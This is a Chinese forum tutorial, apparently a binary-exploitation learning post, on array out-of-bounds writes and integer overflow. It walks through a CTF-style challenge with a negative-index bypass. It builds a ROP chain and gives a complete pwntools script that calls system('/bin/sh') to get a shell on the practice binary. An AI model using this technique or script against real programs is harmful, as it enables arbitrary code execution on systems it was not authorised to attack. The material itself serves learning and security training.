
# [分享]整数溢出+数组越界【二进制学习】

## 1. 数组越界

堆中的数组越界：因为堆是我们自己分配的，如果越界会把堆中其他空间的数据写掉或着读取其他空间的数据。如果是变量则会引起数值改变，如果是指针则可能会引起crash。

栈中的数组越界：因为栈是向下增长的，进入函数前，会把参数和下一条指令地址压栈，如果覆盖了当前函数的`ebp`（栈底），那么栈还原时`esp`（栈顶）就不正确指向，从而发送未知错误（大部分是程序崩溃退出），`ebp`后面的返回地址也被覆盖那么程序执行流程则可被控制。

## 2. 例题实践（栈上溢出）

check文件

![](https://bbs.kanxue.com/upload/attach/201808/778210_VKQTJGUHXYEZBMG.jpg)

64位，开启了栈保护和NX保护

IDA查看主函数

```
unsigned __int64 hacker()

{

  signed int j; // [rsp+8h] [rbp-78h]

  signed int i; // [rsp+Ch] [rbp-74h]

  __int64 v3; // [rsp+10h] [rbp-70h]

  __int64 v4; // [rsp+18h] [rbp-68h]

  __int64 s[11]; // [rsp+20h] [rbp-60h]

  unsigned __int64 v6; // [rsp+78h] [rbp-8h]



  v6 = __readfsqword(0x28u);

  puts("Welcome to hacker's system\n");

  puts("Now you can set hackers' age\n");

  memset(s, 0, 0x50uLL);

  for ( i = 0; i <= 9; ++i )

  {

    puts("Enter hacker index:");

    __isoc99_scanf("%lld", &v3);

    puts("Enter hacker age:");

    __isoc99_scanf("%lld", &v4);

    if ( v3 > 9 )           #漏洞点   索引只判断了大于9的情况没有判断小于0的情况，所以利用负数可以绕过。

      exit(0);

    s[v3] = v4;

  }

  puts("Now let's see your creation:'");

  for ( j = 0; j <= 9; ++j )

    printf("%lld ", s[j]);

  return __readfsqword(0x28u) ^ v6;

}
```

![](https://bbs.kanxue.com/upload/attach/201808/778210_V4MB5V67ZRHJ7FE.jpg)

计算覆盖返回值的偏移 `E88 - E20 = 68 ---> Dh`

前面的整数溢出知识可以绕过数组下标判断，观察汇编：

![](https://bbs.kanxue.com/upload/attach/201808/778210_MCTN2NE34HKTY9A.jpg)

`rax`---> 数组下标  
`rdx`---> 输入的变量  
`[rbp + rax * 8 + s], rdx` 是数组寻址方式。

这里可以控制`rax`的值，而`rax`的范围是 ---> `0x8000000000000000 < rax < 0xffffffffffffffff`

因为64位最高位是16位多出的部分会被截断所以`rax`可以有多个值本文选用`0xA00000000000000D`变量

有任意地址写的能力，接下来就需要堆栈内数据布局了。

因为文件有`system`函数，所以我们只需要输入`/bin/sh`就能得到shell。

通过`scanf`函数将输入的`/bin/sh`写到`bss`段上，控制跳转到`system`执行即可拿到shell。

### 堆栈内数据布局

1. `ret`返回地址`0x400A33`
2. `%s`--->`[0x400AFC]`
3. `ret`返回地址`0x400A31`
4. `bss_addr` bss基地址
5. `r15`寄存器 随意变量
6. `scanf_f`函数`scanf`地址
7. `ret`返回地址`0x400A33`
8. `bss_addr` bss基地址 此时已将`/bin/sh`字串写入
9. `ret`返回地址`system_addr` got地址
10. 任意值输入

### 完整利用代码

```
#!/usr/bin/pyhton

   from pwn import *                                                                                                           

   import pdb

  

   context.log_level = 'debug'

   target = process('./5b1126f06e10c')

   elf = ELF('./5b1126f06e10c')

   bss_addr = elf.bss()

   pop_rdi = 0x400a33

 pop_rsi = 0x400a31

 ret_addr = -6917529027641081843

 scanf_formot = 0x400AFC

 scanf_addr = elf.symbols['__isoc99_scanf']

 system_addr = elf.symbols['system']



 #pdb.set_trace()



 target.recvuntil('name:\n')

 target.sendline('hx')

 #1

 target.recvuntil('index:\n')

 target.sendline('%s' %(ret_addr))

 target.recvuntil('age:\n')

 target.sendline('%s' % (pop_rdi))



 #2

 target.recvuntil('index:\n')

 target.sendline('%s' %(ret_addr+1))

 target.recvuntil('age:\n')

 target.sendline('%s' %(scanf_formot))



 #3

 target.recvuntil('index:\n')

 target.sendline('%s' %(ret_addr+2))

 target.recvuntil('age:\n')

 target.sendline('%s' %(pop_rsi))



 #4

 target.recvuntil('index:\n')

 target.sendline('%s' %(ret_addr+3))

 target.recvuntil('age:\n')

 target.sendline('%s' %(bss_addr))



 #5

 target.recvuntil('index:\n')

 target.sendline('%s' %(ret_addr+4))

 target.recvuntil('age:\n')

 target.sendline('%s' %(0x1))





 #6

 target.recvuntil('index:\n')

 target.sendline('%s' %(ret_addr+5))

 target.recvuntil('age:\n')

 target.sendline('%s' %(scanf_addr))



 #7

 target.recvuntil('index:\n')

 target.sendline('%s' %(ret_addr+6))

 target.recvuntil('age:\n')

 target.sendline('%s' %(pop_rdi))



 #8

 target.recvuntil('index:\n')

 target.sendline('%s' %(ret_addr+7))

 target.recvuntil('age:\n')

 target.sendline('%s' %(bss_addr))



 #9

 target.recvuntil('index:\n')

 target.sendline('%s' %(ret_addr+8))

 target.recvuntil('age:\n')

 target.sendline('%s' %(system_addr))



 #10

 target.recvuntil('index:\n')

 target.sendline('%s' %(ret_addr+9))

 target.recvuntil('age:\n')

 target.sendline('%s' %(0x1))



 target.sendline('/bin/sh')





 #pdb.set_trace()





 target.interactive()
```

效果图：

![](https://bbs.kanxue.com/upload/attach/201808/778210_R78EJUQXCNVDM8D.jpg)![](https://bbs.kanxue.com/upload/attach/201808/778210_Y54N7MQ8D29EKVK.jpg)

感谢看雪论坛和论坛上大佬们的无私奉献！

链接：

https://bbs.pediy.com/thread-228652.htm

[冰与火的战歌：Windows内核攻防实战高级班！从零到实战，融合AI与Windows内核攻防全技术栈，打造具备自动化能力的内核开发高手。](https://www.kanxue.com/book-section_list-227.htm)
